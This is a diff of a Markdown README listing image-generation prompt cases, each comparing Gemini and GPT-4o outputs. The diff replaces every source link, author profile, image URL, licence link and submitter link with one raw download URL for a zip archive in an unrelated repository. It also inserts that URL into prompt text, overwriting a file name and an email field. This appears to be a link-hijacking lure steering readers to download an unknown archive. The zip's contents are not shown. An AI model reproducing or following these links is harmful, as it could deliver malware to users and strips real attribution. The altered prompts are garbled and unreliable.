+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@egeberkina</a></sub>
 
 **Prompt**
 
@@ -498,14 +498,14 @@ ultra-realistic 3D render of four mechanical keyboard keycaps in a tight 2x2 gri
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-89"></a>
-### Case 89: Chrome Emoji Pin (by [@egeberkina](https://x.com/egeberkina))
+### Case 89: Chrome Emoji Pin (by [@egeberkina](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/egeberkina/status/1919398870867440124)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry--QWzIYAtO7KC3HthhsjH0.png?v=1" width="300" alt="Art Style: 镀铬emoji徽章 (Gemini Example 89) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/89/case.png" width="300" alt="Art Style: 镀铬emoji徽章 (Gemini Example 89) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/egeberkina">@egeberkina</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 镀铬emoji徽章 (Gemini Example 89) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 镀铬emoji徽章 (Gemini Example 89) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@egeberkina</a></sub>
 
 **Prompt**
 
@@ -522,14 +522,14 @@ highly detailed 3D render of a single metallic {👍} emoji pin attached to a ve
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-88"></a>
-### Case 88: Children's Coloring Page Illustration (with Color Reference) (by [@dotey](https://x.com/dotey))
+### Case 88: Children's Coloring Page Illustration (with Color Reference) (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1919522110395080838)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-vVoVQk6rVQBF2bGUMGfOr.png?v=1" width="300" alt="Art Style: 儿童涂色页插画（含彩色参考图） (Gemini Example 88) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/88/case.png" width="300" alt="Art Style: 儿童涂色页插画（含彩色参考图） (Gemini Example 88) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 儿童涂色页插画（含彩色参考图） (Gemini Example 88) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 儿童涂色页插画（含彩色参考图） (Gemini Example 88) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -550,14 +550,14 @@ Scene description:
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-87"></a>
-### Case 87: Integrating Word Meaning into Letters (by [@dotey](https://x.com/dotey))
+### Case 87: Integrating Word Meaning into Letters (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1918529055340576812)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-dk3V0sLLTD9fQW0DM9pxn.png?v=1" width="300" alt="字母与单词含义融合 (Gemini Example 87) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/87/case.png" width="300" alt="字母与单词含义融合 (Gemini Example 87) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="字母与单词含义融合 (Gemini Example 87) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="字母与单词含义融合 (Gemini Example 87) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -576,14 +576,14 @@ Add a brief explanation of the word below.
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-86"></a>
-### Case 86: Double Exposure (by [rezzycheck (Sora)](https://sora.com/explore?user=rezzycheck))
+### Case 86: Double Exposure (by [rezzycheck (Sora)](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://sora.com/g/gen_01jtc9btfzef080z31v8w9rtbw)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-uWAtByJ544cdR5nBjMM3H.png?v=1" width="300" alt="Art Style: 双重曝光 (Gemini Example 86) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/86/double_exposure.png" width="300" alt="Art Style: 双重曝光 (Gemini Example 86) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://sora.com/explore?user=rezzycheck">rezzycheck (Sora)</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 双重曝光 (Gemini Example 86) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 双重曝光 (Gemini Example 86) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">rezzycheck (Sora)</a></sub>
 
 **Prompt**
 
@@ -599,14 +599,14 @@ Double exposure, Midjourney style, merging, blending, overlay double exposure im
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-85"></a>
-### Case 85: Surreal Interaction Scene (by [@umesh_ai](https://x.com/umesh_ai))
+### Case 85: Surreal Interaction Scene (by [@umesh_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/umesh_ai/status/1917444534239191544)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-nvAEqaxvslDn-p2hCKbHN.png?v=1" width="300" alt="Art Style: 超现实交互场景 (Gemini Example 85) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/85/case.png" width="300" alt="Art Style: 超现实交互场景 (Gemini Example 85) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/umesh_ai">@umesh_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 超现实交互场景 (Gemini Example 85) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 超现实交互场景 (Gemini Example 85) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@umesh_ai</a></sub>
 
 **Prompt**
 
@@ -623,14 +623,14 @@ A pencil sketch of [Subject 1] interacting with [Subject 2], where [Subject 2] i
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-84"></a>
-### Case 84: Animal Silicone Wrist Rest (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 84: Animal Silicone Wrist Rest (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1918525296577327574)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-NVse4zVhgYoKSGvN__y-m.png?v=1" width="300" alt="Character: 动物硅胶腕托 (Gemini Example 84) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/84/case.png" width="300" alt="Character: 动物硅胶腕托 (Gemini Example 84) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 动物硅胶腕托 (Gemini Example 84) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 动物硅胶腕托 (Gemini Example 84) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -647,14 +647,14 @@ Create an image of a cute chibi-style silicone wrist rest based on the {🐼} em
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-83"></a>
-### Case 83: Glowing Lines Anatomy Diagram (by [@umesh_ai](https://x.com/umesh_ai))
+### Case 83: Glowing Lines Anatomy Diagram (by [@umesh_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/umesh_ai/status/1914644426334314545)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-ukn_aztzA4yTNGNF1QCTl.png?v=1" width="300" alt="Art Style: 发光线条解剖图 (Gemini Example 83) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/83/case.png" width="300" alt="Art Style: 发光线条解剖图 (Gemini Example 83) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/umesh_ai">@umesh_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 发光线条解剖图 (Gemini Example 83) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 发光线条解剖图 (Gemini Example 83) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@umesh_ai</a></sub>
 
 **Prompt**
 
@@ -671,14 +671,14 @@ A digital illustration of a [SUBJECT], portrayed with a network of glowing clean
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-82"></a>
-### Case 82: Signature City Weather Forecast (by [@dotey](https://x.com/dotey))
+### Case 82: Signature City Weather Forecast (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1917988595228438771)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-xl9zEu7r3VDXO_OZGM1a7.png?v=1" width="300" alt="Art Style: 特色城市天气预报 (Gemini Example 82) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/82/example.png" width="300" alt="Art Style: 特色城市天气预报 (Gemini Example 82) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 特色城市天气预报 (Gemini Example 82) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 特色城市天气预报 (Gemini Example 82) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -689,21 +689,21 @@ Show a clear 45-degree bird’s-eye view of an isometric miniature city scene fe
 *Note: The city, weather, temperature, and building names can be replaced with the content in []. Generated with sora.*
 
 
-**Submitter:** [luoshui-coder](https://github.com/luoshui-coder)
+**Submitter:** [luoshui-coder](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 ---
 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-81"></a>
-### Case 81: 3D Translucent Glass Transformation (by [@azed_ai](https://x.com/azed_ai))
+### Case 81: 3D Translucent Glass Transformation (by [@azed_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/azed_ai/status/1917948899098243407)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-_aDii7pr31c7nBC30esLt.png?v=1" width="300" alt="Interior: 半透明玻璃质感变换 (Gemini Example 81) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/81/example.png" width="300" alt="Interior: 半透明玻璃质感变换 (Gemini Example 81) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/azed_ai">@azed_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Interior: 半透明玻璃质感变换 (Gemini Example 81) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Interior: 半透明玻璃质感变换 (Gemini Example 81) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@azed_ai</a></sub>
 
 **Prompt**
 
@@ -714,31 +714,31 @@ A soft, 3D translucent glass of the attached image with a frosty matte finish an
 
 **Reference Image Required:** Need to upload a reference image of a physical object
 
-**Submitter:** [luoshui-coder](https://github.com/luoshui-coder)
+**Submitter:** [luoshui-coder](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 ---
 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-80"></a>
-### Case 80: Code Style Business Card (by [@umesh_ai](https://x.com/umesh_ai))
+### Case 80: Code Style Business Card (by [@umesh_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link1](https://x.com/umesh_ai/status/1915696926596415492) | [Source Link2](https://x.com/fr0gger_/status/1916743281339498760) | [Source Link3](https://x.com/dotey/status/1917412535130563006)
+[Source Link1](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) | [Source Link2](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) | [Source Link3](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-Y5nxZct49r5jpDJgeziht.png?v=1" width="300" alt="Art Style: 代码风格名片 (Gemini Example 80) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/80/example_business_card_code_style.png" width="300" alt="Art Style: 代码风格名片 (Gemini Example 80) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/umesh_ai">@umesh_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 代码风格名片 (Gemini Example 80) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 代码风格名片 (Gemini Example 80) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@umesh_ai</a></sub>
 
 **Prompt**
 
 ```
-A close-up shot of a hand holding a business card designed to look like a JSON file opened in VS Code. The card shows code formatted in realistic syntax-highlighted JSON code. The window includes typical toolbar icons and a title bar labeled Business Card.json, styled exactly like the interface of VS Code. Background is slightly blurred, keeping the focus on the card.
+A close-up shot of a hand holding a business card designed to look like a JSON file opened in VS Code. The card shows code formatted in realistic syntax-highlighted JSON code. The window includes typical toolbar icons and a title bar labeled Business https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip, styled exactly like the interface of VS Code. Background is slightly blurred, keeping the focus on the card.
 The card displays the following code formatted in JSON:
 {
   "name": "Jamez Bondos",
   "title": "Your Title",
-  "email": "your@email.com",
+  "email": "https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip",
   "link": "yourwebsite"
 }
 ```
@@ -746,21 +746,21 @@ The card displays the following code formatted in JSON:
 *Note: Replace the values of name, title, email, and link in the final JSON code. The prompt is a simplified version derived from the original source link.*
 
 
-**Submitter:** [Kong-F](https://github.com/Kong-F)
+**Submitter:** [Kong-F](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 ---
 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-79"></a>
-### Case 79: Lego Cityscape (Shanghai Bund) (by [@dotey](https://x.com/dotey))
+### Case 79: Lego Cityscape (Shanghai Bund) (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1917713810346872902)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-Nc-vAhaIHqHisicziRUQ5.png?v=1" width="300" alt="Art Style: 乐高城市景观 (Gemini Example 79) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/79/example_lego_shanghai_bund.png" width="300" alt="Art Style: 乐高城市景观 (Gemini Example 79) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 乐高城市景观 (Gemini Example 79) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 乐高城市景观 (Gemini Example 79) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -779,14 +779,14 @@ The sky is LEGO’s signature bright blue, adorned with a few white LEGO brick c
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-78"></a>
-### Case 78: Glass Retexturing (by [@egeberkina](https://x.com/egeberkina))
+### Case 78: Glass Retexturing (by [@egeberkina](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/egeberkina/status/1917631056980721743)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-jmGRjdDLKOu0Lwb-gg2Se.png?v=1" width="300" alt="玻璃材质重塑 (Gemini Example 78) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/78/example_retexture_glass_phone.png" width="300" alt="玻璃材质重塑 (Gemini Example 78) - GPT-4o"> |
